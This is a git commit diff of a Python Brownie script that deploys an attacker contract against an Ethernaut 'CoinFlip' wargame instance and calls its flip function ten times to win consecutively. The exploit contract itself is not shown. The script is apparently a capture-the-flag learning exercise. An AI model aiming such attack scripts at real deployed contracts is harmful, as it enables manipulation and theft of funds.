80940aca4420dbb8f27845911bc3490560c82f3b
sarobinson2001 <sarobinson2011@gmail.com>
2023-08-17 21:31:37 +0100

    update scripts

--- scripts/deploy_attack.py
+++ scripts/deploy_attack.py
@@ -3,6 +3,7 @@ from brownie import accounts, config, interface, Attack
 
 # Level 3 - CoinFlip - instance generated (for the level 3 'CoinFlip' contract)
 ETHERNAUT_INSTANCE = "0xdc06FD5A0D5aa673A123db5A6Fc041090E063D0A"
+REQUIRED_NUMBER_OF_WINS = 10
 
 
 def main():
@@ -12,14 +13,15 @@ def main():
 
     # To deploy the attacker contract: To interact with the coinflip contract (i.e. Acting as a proxy)
     # Passing in coinflip_contract address for the constructor to initialise the contract.
-    attack_coinflip = Attack.deploy(contract, {"from": player})
+    attack = Attack.deploy(contract, {"from": player})
 
-    print(f"Deployed - attack address is: {attack_coinflip.address}")
+    print(f"Deployed - attack address is: {attack.address}")
 
     coinflip_interface = interface.ICoinFlip(contract)
 
-    for i in range(10):
-        attack_coinflip.flip(
-            {"from": player, "gas_limit": 10000000, "allow_revert": True}
-        )
+    for i in range(REQUIRED_NUMBER_OF_WINS):
+        attack.flip({"from": player, "gas_limit": 10000000, "allow_revert": True})
         print("Consecutive wins: ", coinflip_interface.consecutiveWins())
+
+
+# what dies dot .deploy actually do? >
